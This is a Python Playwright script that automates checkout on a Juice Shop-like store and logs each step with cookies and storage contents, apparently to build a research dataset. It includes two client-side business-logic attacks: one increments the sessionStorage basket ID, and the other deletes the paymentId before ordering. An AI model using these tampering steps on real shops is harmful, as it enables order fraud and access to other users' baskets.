import time
import json
import os
import pandas as pd
from playwright.sync_api import sync_playwright
import logging

# Configure logging
logging.basicConfig(
    filename='resource/automation_interactions.log',
    level=logging.INFO,
    format='[%(levelname)s] %(message)s'
)

def log_print(msg):
    print(msg)
    logging.info(msg)

class BusinessLogicLogger:
    def __init__(self, base_url, output_csv="automation_workflow.csv", run_id="O"):
        self.base_url = base_url.rstrip("/")
        self.output_csv = output_csv
        self.dataset = []
        self.logged_in = False  # Track login state

        self.run_id = run_id
        self.row_counter = 1

    def log_action(self, page, action, element, input_value=None, nature=0, logged_url=None, before_value="", after_value=""):
        """
        Logs automation actions dynamically.
        Optionally uses 'logged_url' if provided (e.g. the URL before a click).
        The fields before_value and after_value are recorded only when nature==1.
        """
        try:
            row_id = f"{self.run_id}{self.row_counter}"
            self.row_counter += 1
            if logged_url is None:
                logged_url = page.url

            # Evaluate the element details (if possible)
            selector = element.evaluate(
                "el => el.tagName.toLowerCase() + (el.id ? '#' + el.id : '') + (el.className ? '.' + el.className.split(' ').join('.') : '')"
            )
            label = element.evaluate(
                """el => el.getAttribute('name') ||
                        el.getAttribute('placeholder') ||
                        el.getAttribute('title') ||
                        el.getAttribute('aria-label') ||
                        el.innerText.trim() ||
                        'Unnamed Element'"""
            )

            log_print(f"[📝] {action}: {label} ({selector}) on {logged_url}")

            session_data = self.get_storage_data(page, "sessionStorage")
            local_data = self.get_storage_data(page, "localStorage")
            cookies = page.context.cookies()

            log_entry = {
                "id":row_id,
                "url": logged_url,
                "action": action,
                "element_label": label,
                "selector": selector,
                "input_value": input_value,
                "nature": nature,
                "before_value": before_value if nature == 1 else "",
                "after_value": after_value if nature == 1 else "",
                "session_data": json.dumps(session_data),
                "local_storage": json.dumps(local_data),
                "cookies": json.dumps(cookies)
            }

            self.dataset.append(log_entry)

        except Exception as e:
            log_print(f"[⚠️] Error logging action: {e}")

    def get_storage_data(self, page, storage_type):
        """
        Extract sessionStorage or localStorage as JSON.
        """
        try:
            return page.evaluate(
                f"() => {{ let s = {{}}; for (let i = 0; i < {storage_type}.length; i++) " +
                f"{{ let key = {storage_type}.key(i); s[key] = {storage_type}.getItem(key); }} return s; }}"
            )
        except Exception as e:
            log_print(f"[⚠️] Failed to extract {storage_type}: {e}")
            return {}

    def save_dataset(self):
        if self.dataset:
            df = pd.DataFrame(self.dataset)
            desired_cols = [
                "id", "url", "action", "element_label", "selector", "input_value",
                "nature", "before_value", "after_value", "session_data", "local_storage", "cookies"
            ]
            for col in desired_cols:
                if col not in df.columns:
                    df[col] = ""
            df = df[desired_cols]

            # --- APPEND if file exists, otherwise create new ---
            file_exists = os.path.exists(self.output_csv)
            mode = 'a' if file_exists else 'w'
            header = not file_exists  # Only write header if file doesn't exist

            df.to_csv(self.output_csv, mode=mode, header=header, index=False)
            log_print(f"[📊] Dataset appended to {self.output_csv}")


    def perform_click_capture(self, page, locator_or_element, nature=0, wait_seconds=2,
                            before_value="", after_value=""):
        """
        1) Capture the old URL and element details (label/selector) BEFORE clicking.
        2) Perform the click.
        3) Wait for wait_seconds (to allow page navigation/storage updates).
        4) Log the action using the pre-captured details, so it won't fail if the element is detached.
        """
        old_url = page.url

        # Get the element (either a locator or from a selector string)
        if hasattr(locator_or_element, "click"):
            element = locator_or_element
        else:
            element = page.locator(locator_or_element)

        # Pre-capture label/selector
        try:
            pre_selector = element.evaluate("""
                el => el.tagName.toLowerCase() +
                    (el.id ? '#' + el.id : '') +
                    (el.className ? '.' + el.className.split(' ').join('.') : '')
            """)
            pre_label = element.evaluate("""
                el => el.getAttribute('name') ||
                    el.getAttribute('placeholder') ||
                    el.getAttribute('title') ||
                    el.getAttribute('aria-label') ||
                    el.innerText.trim() ||
                    'Unnamed Element'
            """)
        except Exception as e:
            pre_selector = "unknown"
            pre_label = "Unknown Element"
            log_print(f"[⚠️] Could not capture element details before click: {e}")

        # Perform the click
        element.click()
        time.sleep(wait_seconds)

        # Now log the action using the PRE-captured details
        try:
            row_id = f"{self.run_id}{self.row_counter}"
            self.row_counter += 1
            session_data = self.get_storage_data(page, "sessionStorage")
            local_data = self.get_storage_data(page, "localStorage")
            cookies = page.context.cookies()

            log_entry = {
                "id": row_id,
                "url": old_url,  # the page URL before navigation
                "action": "Click",
                "element_label": pre_label,
                "selector": pre_selector,
                "input_value": None,
                "nature": nature,
                "before_value": before_value if nature == 1 else "",
                "after_value": after_value if nature == 1 else "",
                "session_data": json.dumps(session_data),
                "local_storage": json.dumps(local_data),
                "cookies": json.dumps(cookies)
            }
            self.dataset.append(log_entry)

            log_print(f"[📝] Click: {pre_label} ({pre_selector}) on {old_url}")
        except Exception as e:
            log_print(f"[⚠️] Error logging click action: {e}")


    def perform_login(self, page):
        """
        Automates login once using fixed credentials.
        """
        if self.logged_in:
            log_print("[⚠️] Already logged in, skipping login step.")
            return

        log_print("[🔑] Navigating to login page...")
        page.goto(f"{self.base_url}/#/login", wait_until="domcontentloaded")
        time.sleep(2)

        email_selector = 'input[name="email"]'
        page.fill(email_selector, "ttt@gmail.com")
        self.log_action(page, "Input", page.locator(email_selector), input_value="ttt@gmail.com")

        password_selector = 'input[name="password"]'
        page.fill(password_selector, "ttttt")
        self.log_action(page, "Input", page.locator(password_selector), input_value="ttttt")
        time.sleep(2)

        login_button_selector = 'button[type="submit"]'
        # Use the click capture helper to log the login click.
        self.perform_click_capture(page, login_button_selector, wait_seconds=2)

        time.sleep(3)

        auth_token = page.evaluate("() => window.localStorage.getItem('token') || window.sessionStorage.getItem('token')")
        if auth_token:
            log_print("[✅] Login successful!")
            self.logged_in = True
        else:
            log_print("[❌] Login failed. Please check credentials.")

    def perform_add_to_cart(self, page):
        """
        Clicks "Add to Basket" dynamically.
        """
        log_print("[🛒] Attempting to add item to basket...")

        buttons = page.locator("button").all()
        for button in buttons:
            try:
                button_text = button.evaluate("el => el.innerText.trim() || el.getAttribute('aria-label') || 'Unnamed Button'")
                if "add to basket" in button_text.lower():
                    self.perform_click_capture(page, button, wait_seconds=2)
                    return
            except Exception as e:
                log_print(f"[⚠️] Failed to click 'Add to Basket': {e}")

    def perform_click_basket(self, page):
        """
        Clicks the basket icon in the navbar.
        """
        log_print("[🛍️] Clicking basket icon...")

        basket_button = page.locator("button:has-text('Your Basket')")
        if basket_button.count() > 0:
            self.perform_click_capture(page, basket_button.first, wait_seconds=3)
        else:
            log_print("[⚠️] Basket button not found!")

    def perform_checkout(self, page):
        """
        Clicks the "Checkout" button dynamically.
        """
        log_print("[🛒] Clicking 'Checkout'...")

        checkout_button = page.locator("button#checkoutButton")
        if checkout_button.count() > 0:
            self.perform_click_capture(page, checkout_button.first, wait_seconds=1)
        else:
            log_print("[⚠️] Checkout button not found!")

    def perform_add_address(self, page):
        """
        Clicks the "Add New Address" button, fills the form, and submits it.
        """
        log_print("[🏠] Clicking 'Add New Address' button...")

        add_address_button = page.locator("button:has-text('Add New Address')")
        if add_address_button.count() > 0:
            self.perform_click_capture(page, add_address_button.first, wait_seconds=1)
        else:
            log_print("[⚠️] 'Add New Address' button not found!")

        log_print("[🏠] Filling in the address form...")

        address_data = {
            "input#mat-input-3": "Test Country",
            "input#mat-input-4": "Test Name",
            "input#mat-input-5": "123456789",
            "input#mat-input-6": "12345",
            "textarea#address": "Test Street",
            "input#mat-input-8": "Test City",
            "input#mat-input-9": "Test State"
        }

        for selector, value in address_data.items():
            field = page.locator(selector)
            if field.count() > 0:
                field.fill(value)
                self.log_action(page, "Input", field, input_value=value)
                time.sleep(1)

        log_print("[✅] Address form filled. Clicking submit...")

        submit_button = page.locator("button:has-text('Submit')")
        if submit_button.count() > 0:
            self.perform_click_capture(page, submit_button.first, wait_seconds=3)
        else:
            log_print("[⚠️] Submit button not found!")

    def select_address_and_continue(self, page):
        """
        Selects any available radio button for address selection and clicks 'Continue'.
        """
        log_print("[📌] Selecting an address and continuing checkout...")

        radio_buttons = page.locator("mat-radio-button").all()
        if radio_buttons:
            log_print(f"[✅] Found {len(radio_buttons)} radio buttons. Clicking the first one...")
            try:
                self.perform_click_capture(page, radio_buttons[0], wait_seconds=2)
            except Exception as e:
                log_print(f"[⚠️] Failed to click using normal method: {e}")
                log_print("[🔄] Trying alternative method using JavaScript...")
                page.evaluate("document.querySelector('mat-radio-button').click()")
                self.log_action(page, "Click (JS)", radio_buttons[0])
                time.sleep(2)
        else:
            log_print("[⚠️] No radio buttons found!")

        continue_buttons = page.locator("button").all()
        for btn in continue_buttons:
            try:
                btn_text = btn.evaluate("el => el.innerText.trim() || el.getAttribute('aria-label') || 'Unnamed Button'")
                if "continue" in btn_text.lower():
                    self.perform_click_capture(page, btn, wait_seconds=3)
                    return
            except Exception as e:
                log_print(f"[⚠️] Failed to click 'Continue' button: {e}")

        log_print("[❌] 'Continue' button not found!")

    def select_radio_and_continue_on_new_page(self, page):
        """
        Selects a radio button on the new page and clicks 'Continue'.
        """
        log_print("[📌] Selecting a radio button on the new page...")
        time.sleep(2)
        
        radio_buttons = page.locator("mat-radio-button").all()
        if len(radio_buttons) > 0:
            log_print(f"[✅] Found {len(radio_buttons)} radio buttons. Clicking one...")
            try:
                self.perform_click_capture(page, radio_buttons[0], wait_seconds=2)
            except Exception as e:
                log_print(f"[⚠️] Failed to click normally: {e}")
                log_print("[🔄] Trying alternative method using JavaScript...")
                page.evaluate("document.querySelectorAll('mat-radio-button')[0].click()")
                self.log_action(page, "Click (JS)", radio_buttons[0])
                time.sleep(2)
        else:
            log_print("[⚠️] No radio buttons found on this page!")

        continue_buttons = page.locator("button").all()
        for btn in continue_buttons:
            try:
                btn_text = btn.evaluate("el => el.innerText.trim() || el.getAttribute('aria-label') || 'Unnamed Button'")
                if "continue" in btn_text.lower():
                    self.perform_click_capture(page, btn, wait_seconds=3)
                    return
            except Exception as e:
                log_print(f"[⚠️] Failed to click 'Continue' button: {e}")

        log_print("[❌] 'Continue' button not found on the new page!")

    def click_add_new_card_panel(self, page):
        """
        Clicks the 'Add New Card' expansion panel correctly.
        """
        log_print("[💳] Finding the correct 'Add New Card' expansion panel...")

        expansion_panel_headers = page.locator("mat-expansion-panel-header")
        found = False
        for header in expansion_panel_headers.all():
            try:
                panel_title_locator = header.locator("mat-panel-title")
                panel_title = panel_title_locator.inner_text().strip()
                log_print(f"[🔍] Found Expansion Panel: '{panel_title}'")
                if "add new card" in panel_title.lower():
                    log_print(f"[✅] Clicking 'Add New Card' panel...")
                    self.perform_click_capture(page, header, wait_seconds=2)
                    found = True
                    break
            except Exception as e:
                log_print(f"[⚠️] Error finding/clicking panel title: {e}")

        if not found:
            log_print("[❌] 'Add New Card' panel NOT found!")

    def fill_card_details_and_submit(self, page):
        """
        Fills in the 'Add New Card' form, submits it, selects the card, and clicks continue.
        """
        log_print("[💳] Filling in card details...")

        card_data = {
            "input#mat-input-10": "Test User",
            "input#mat-input-11": "4111111111111111"
        }

        for selector, value in card_data.items():
            try:
                field = page.locator(selector)
                field.fill(value)
                self.log_action(page, "Input", field, input_value=value)
                log_print(f"[✅] Filled '{value}' into {selector}")
                time.sleep(1)
            except Exception as e:
                log_print(f"[⚠️] Failed to fill {selector}: {e}")

        try:
            log_print("[📅] Selecting Expiry Month...")
            expiry_month_dropdown = page.locator("select#mat-input-12")
            expiry_month_dropdown.select_option("6")
            self.log_action(page, "Select", expiry_month_dropdown, input_value="6")
            log_print("[✅] Expiry Month set to: 6 (June)")
            time.sleep(1)
        except Exception as e:
            log_print(f"[⚠️] Failed to select expiry month: {e}")

        try:
            log_print("[📅] Selecting Expiry Year...")
            expiry_year_dropdown = page.locator("select#mat-input-13")
            expiry_year_dropdown.select_option("2085")
            self.log_action(page, "Select", expiry_year_dropdown, input_value="2085")
            log_print("[✅] Expiry Year set to: 2085")
            time.sleep(1)
        except Exception as e:
            log_print(f"[⚠️] Failed to select expiry year: {e}")

        try:
            log_print("[📤] Clicking Submit Button...")
            submit_button = page.locator("button#submitButton")
            self.perform_click_capture(page, submit_button, wait_seconds=3)
            log_print("[✅] Submitted Card Details Successfully!")
        except Exception as e:
            log_print(f"[⚠️] Failed to submit card details: {e}")

        time.sleep(2)

        try:
            log_print("[💳] Selecting the newly added card...")
            card_radio_button = page.locator("mat-radio-button")
            last_card_radio = card_radio_button.nth(-1)
            self.perform_click_capture(page, last_card_radio, wait_seconds=2)
            log_print("[✅] Selected newly added card.")
        except Exception as e:
            log_print(f"[⚠️] Failed to select card radio button: {e}")

        try:
            log_print("[➡️] Clicking 'Continue' button to proceed...")
            continue_button = page.locator("button:has-text('Continue')")
            self.perform_click_capture(page, continue_button, wait_seconds=1)
            log_print("[✅] Clicked 'Continue' to proceed!")
        except Exception as e:
            log_print(f"[⚠️] Failed to click 'Continue' button: {e}")

    def place_order_and_pay(self, page):
        """
        Clicks the 'Place Your Order and Pay' button to finalize the order.
        """
        try:
            log_print("[🛒] Attempting to place the order...")
            place_order_button = page.locator("button:has-text('Place your order and pay')")
            if place_order_button.count() > 0:
                self.perform_click_capture(page, place_order_button, wait_seconds=3)
                log_print("[✅] Clicked 'Place Your Order and Pay' button.")
                time.sleep(3)
                if "order-summary" in page.url:
                    log_print("[🎉] Order placed successfully!")
                else:
                    log_print("[⚠️] Order may not have been placed successfully. Check manually.")
            else:
                log_print("[❌] 'Place Your Order and Pay' button not found!")
        except Exception as e:
            log_print(f"[⚠️] Failed to place order: {e}")

    def navigate_to_order_history(self, page):
        """
        Navigates to the Order History page through UI interactions.
        """
        log_print("[📜] Navigating to Order History...")

        try:
            account_menu = page.locator("button#navbarAccount")
            if account_menu.count() > 0:
                self.perform_click_capture(page, account_menu, wait_seconds=1)
                log_print("[✅] Clicked Account Menu.")
            else:
                log_print("[⚠️] Account menu button not found!")
                return

            orders_payment_button = page.locator("button:has-text('Orders & Payment')")
            if orders_payment_button.count() > 0:
                self.perform_click_capture(page, orders_payment_button, wait_seconds=1)
                log_print("[✅] Clicked 'Orders & Payment'.")
            else:
                log_print("[⚠️] 'Orders & Payment' button not found!")
                return

            order_history_button = page.locator("button[mat-menu-item]:has-text('Order History')")
            if order_history_button.count() > 0:
                self.perform_click_capture(page, order_history_button, wait_seconds=2)
                log_print("[✅] Clicked 'Order History'.")
            else:
                log_print("[⚠️] 'Order History' button not found! Trying direct navigation.")
                page.goto(f"{self.base_url}/#/order-history", wait_until="domcontentloaded")

            log_print("[✅] Order History page loaded successfully!")
        except Exception as e:
            log_print(f"[❌] Error navigating to Order History: {e}")

    def perform_logout(self, page):
        """
        Automates logout by clicking on the navbar account button, then clicking 'Logout'.
        """
        log_print("[🚪] Attempting to log out...")

        try:
            account_button = page.locator("button:has-text('Account')")
            if account_button.count() > 0:
                self.perform_click_capture(page, account_button.first, wait_seconds=2)
                log_print("[✅] Clicked account button in navbar.")
            else:
                log_print("[⚠️] Account button not found!")
                return

            logout_button = page.locator("button#navbarLogoutButton")
            if logout_button.count() > 0:
                self.perform_click_capture(page, logout_button.first, wait_seconds=3)
                log_print("[✅] Clicked 'Logout' button.")
                time.sleep(1)
                self.logged_in = False
                log_print("[🔒] Logged out successfully!")
            else:
                log_print("[⚠️] 'Logout' button not found!")
        except Exception as e:
            log_print(f"[⚠️] Error during logout: {e}")

    def navigate_to_wallet(self, page):
        """
        Navigates to the Digital Wallet page through UI interactions,
        but does NOT create any log entries in self.dataset.
        """
        log_print("[💰] Navigating to Digital Wallet page...")

        try:
            # Step 1: Click the Account Dropdown
            account_menu = page.locator("button#navbarAccount")
            if account_menu.count() > 0:
                account_menu.click()
                self.log_action(page, "Click", account_menu)
                log_print("[✅] Clicked Account Menu.")
                time.sleep(1)
            else:
                log_print("[⚠️] Account menu button not found!")
                return
            
            # Step 2: Click "Orders & Payment"
            orders_payment_button = page.locator("button:has-text('Orders & Payment')")
            if orders_payment_button.count() > 0:
                orders_payment_button.click()
                self.log_action(page, "Click", orders_payment_button)
                log_print("[✅] Clicked 'Orders & Payment'.")
                time.sleep(1)
            else:
                log_print("[⚠️] 'Orders & Payment' button not found!")
                return

            # Step 3: Click "Digital Wallet"
            digital_wallet_button = page.locator("button[mat-menu-item]:has-text('Digital Wallet')")
            if digital_wallet_button.count() > 0:
                digital_wallet_button.click()
                self.log_action(page, "Click", digital_wallet_button)
                log_print("[✅] Clicked 'Digital Wallet'.")
                time.sleep(2)  # Allow page to load
            else:
                log_print("[⚠️] 'Digital Wallet' button not found! Falling back to direct navigation.")
                page.goto(f"{self.base_url}/#/wallet", wait_until="domcontentloaded")

            log_print("[✅] Digital Wallet page loaded successfully!")

        except Exception as e:
            log_print(f"[❌] Error navigating to Digital Wallet: {e}")


    def perform_wallet_topup(self, page):
        """
        Performs a normal wallet top-up process using the UI,
        but does NOT create any log entries in self.dataset.
        """
        log_print("[💰] Initiating wallet top-up process...")

        try:
            # Locate the amount input field
            amount_input = page.locator("input#mat-input-3")

            if amount_input.count() > 0:
                # Enter a valid amount
                amount_input.fill("888")
                self.log_action(page, "Input", amount_input, input_value="300")
                log_print("[✅] Entered '888 into Wallet Top-Up field.")
                time.sleep(1)

                # Click the 'Deposit' button
                deposit_button = page.locator("button:has-text('Deposit')")
                if deposit_button.count() > 0:
                    deposit_button.click()
                    self.log_action(page, "Click", deposit_button)
                    log_print("[✅] Clicked 'Deposit' button.")
                    time.sleep(2)  # Allow page to load

                    # Step 2: Select Credit Card (Radio Button)
                    log_print("[💳] Selecting a credit card for payment...")

                    card_radio_buttons = page.locator("mat-radio-button").all()
                    if len(card_radio_buttons) > 0:
                        card_radio_buttons[-1].click()
                        self.log_action(page, "Click", card_radio_buttons[-1])
                        log_print("[✅] Selected a credit card.")
                        time.sleep(1)

                        # Step 3: Click the final "Continue" button to confirm payment
                        final_continue_button = page.locator("button:has-text('Continue')")
                        if final_continue_button.count() > 0:
                            final_continue_button.click()
                            self.log_action(page, "Click", final_continue_button)
                            log_print("[✅] Clicked final 'Continue' button to process payment.")
                            time.sleep(3)  # Allow time for transaction processing
                        else:
                            log_print("[❌] 'Continue' button not found on payment page!")
                    else:
                        log_print("[⚠️] No credit card radio buttons found!")
                else:
                    log_print("[⚠️] 'Deposit' button not found after entering top-up amount!")
            else:
                log_print("[⚠️] Wallet top-up input field not found!")

        except Exception as e:
            log_print(f"[❌] Error during wallet top-up: {e}")

    def attack_bid_manipulation(self, page):
        """
        Extracts the 'bid' (Basket ID) from session storage, modifies it, and refreshes the page.
        Uses log_action() with nature=1 to log before_value and after_value.
        """
        try:
            log_print("[⚠️] Starting BID Manipulation Attack...")

            # Step 1: Extract Original BID
            original_bid = page.evaluate("() => window.sessionStorage.getItem('bid')")
            log_print(f"[🔍] Original BID: {original_bid}")

            if not original_bid:
                log_print("[❌] BID not found in session storage. Exiting attack.")
                return

            # Step 2: Modify BID (e.g., increment by 1)
            altered_bid = str(int(original_bid) + 1)
            log_print(f"[🚀] Injecting Modified BID: {altered_bid}")

            # Step 3: Inject Modified BID
            page.evaluate(f"() => window.sessionStorage.setItem('bid', '{altered_bid}')")

            # Step 4: Refresh Page
            log_print("[🔄] Refreshing page after attack...")
            page.reload(wait_until="domcontentloaded")
            time.sleep(3)

            # Step 5: Extract BID After Attack
            new_bid = page.evaluate("() => window.sessionStorage.getItem('bid')")
            log_print(f"[📊] BID After Attack: {new_bid}")

            # Step 6: Log the attack using your log_action() with nature=1.
            # We use a dummy element (the body) for logging purposes.
            dummy_element = page.locator("body")
            self.log_action(
                page,
                action="BID Manipulation",
                element=dummy_element,
                input_value=f"Before: {original_bid}, After: {new_bid}",
                nature=1,
                before_value=original_bid,
                after_value=new_bid
            )

        except Exception as e:
            log_print(f"[⚠️] BID Attack failed: {e}")

    def select_card_and_continue(self, page):
        """
        Selects an existing card and clicks 'Continue'.
        """
        log_print("[💳] Selecting a saved card for payment...")

        # **Wait for the new payment method to appear**
        time.sleep(2)  # Ensure page reloads with the newly added card

        # **Select the newly added card (Radio Button)**
        try:
            card_radio_buttons = page.locator("mat-radio-button")  # General locator for all radio buttons
            if card_radio_buttons.count() > 0:
                log_print(f"[✅] Found {card_radio_buttons.count()} saved cards. Selecting the last one...")
                last_card_radio = card_radio_buttons.nth(-1)
                last_card_radio.click()
                self.log_action(page, "Click", last_card_radio)
                log_print("[✅] Selected newly added card.")
                time.sleep(2)
            else:
                log_print("[⚠️] No card radio buttons found!")
        except Exception as e:
            log_print(f"[⚠️] Failed to select card radio button: {e}")

        # **Click Continue Button**
        try:
            log_print("[➡️] Clicking 'Continue' button to proceed...")
            continue_button = page.locator("button:has-text('Continue')")
            continue_button.click()
            self.log_action(page, "Click", continue_button)
            log_print("[✅] Clicked 'Continue' to proceed!")
            time.sleep(1)  # Allow navigation to next step
        except Exception as e:
            log_print(f"[⚠️] Failed to click 'Continue' button: {e}")

    def attack_remove_payment_id(self, page):
        """
        Deletes the 'paymentId' from session storage, refreshes the page,
        and logs the before and after state using log_action() with nature=1.
        """
        try:
            log_print("[⚠️] ATTACK: Removing 'paymentId' from session storage before checkout...")

            # Capture session storage BEFORE attack
            before_attack = page.evaluate("() => JSON.stringify(sessionStorage)")
            log_print(f"[📋] Session Storage BEFORE removing paymentId: {before_attack}")

            # Check if 'paymentId' exists before deleting
            payment_id_exists = page.evaluate("() => sessionStorage.getItem('paymentId')")
            if payment_id_exists:
                log_print("[✅] 'paymentId' exists before deletion.")
            else:
                log_print("[❌] 'paymentId' NOT found before deletion!")
                return  # Optionally exit if not found

            # Remove 'paymentId' from sessionStorage
            page.evaluate("() => sessionStorage.removeItem('paymentId')")

            # Capture session storage AFTER attack
            after_attack = page.evaluate("() => JSON.stringify(sessionStorage)")
            log_print(f"[📋] Session Storage AFTER removing paymentId: {after_attack}")

            # Refresh the page to reflect changes
            page.reload(wait_until="domcontentloaded")
            time.sleep(2)

            # Log the attack using log_action with nature=1.
            # Use a dummy element (e.g. page body) for logging purposes.
            dummy_element = page.locator("body")
            self.log_action(
                page,
                action="BID Attack: Remove PaymentId",
                element=dummy_element,
                input_value=f"Removed paymentId; Before: {before_attack}, After: {after_attack}",
                nature=1,
                before_value=before_attack,
                after_value=after_attack
            )

            log_print("[✅] 'paymentId' removed. Proceeding with checkout...")

            # Proceed with clicking the 'Place your order and pay' button.
            try:
                place_order_button = page.locator("button:has-text('Place your order and pay')")
                if place_order_button.count() > 0:
                    self.perform_click_capture(page, place_order_button.first, wait_seconds=3)
                    log_print("[🛒] Clicked 'Place Your Order' button.")
                    time.sleep(3)
                else:
                    log_print("[⚠️] 'Place Order' button not found!")
            except Exception as e:
                log_print(f"[❌] Error clicking 'Place Order' button: {e}")

        except Exception as e:
            log_print(f"[⚠️] BID Attack failed: {e}")


    def run_automation(self, page):
        
        # Change accordingly to flow
        self.perform_login(page)
        self.perform_add_to_cart(page)
        self.perform_click_basket(page)
        # self.attack_bid_manipulation(page) //attack
        self.perform_checkout(page)
        # self.perform_add_address(page)
        self.select_address_and_continue(page)
        self.select_radio_and_continue_on_new_page(page)
        self.select_card_and_continue(page) #remove pid flow
        # self.click_add_new_card_panel(page)
        # self.fill_card_details_and_submit(page)
        self.attack_remove_payment_id(page) #remove pid flow
        self.place_order_and_pay(page)
        # self.navigate_to_order_history(page)
        # self.perform_logout(page)
        # self.navigate_to_wallet(page)
        # time.sleep(5)
        # self.perform_wallet_topup(page)
        self.save_dataset()

if __name__ == "__main__":
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)
        page = browser.new_page()
        logger = BusinessLogicLogger("https://slaying.ddns.net")
        logger.run_automation(page)
        browser.close()
